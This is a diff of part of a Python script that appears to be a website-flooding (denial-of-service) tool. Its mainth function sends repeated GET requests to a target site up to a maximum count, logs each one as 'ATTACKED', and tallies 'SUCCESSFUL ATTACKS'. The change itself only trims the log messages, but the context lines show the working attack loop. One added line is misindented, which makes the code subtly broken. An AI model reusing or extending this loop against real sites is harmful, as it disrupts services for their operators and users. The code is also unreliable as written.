@@ -92,14 +92,14 @@ def mainth(site: str):
                         if response.status_code >= 400:
                             break
                         attacks_number += 1
-                        logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
+                        logger.info(f"ATTACKED {site}; RESPONSE CODE: {response.status_code}")
         else:
             while (attacks_number < settings.MAX_REQUESTS_TO_SITE):
                 response = scraper.get(site, timeout=10)
                 if response.status_code >= 400:
                     break
                 attacks_number += 1
-                        logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
+                        logger.info(f"ATTACKED {site}; RESPONSE CODE: {response.status_code}")
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
     except ConnectionError as exc:
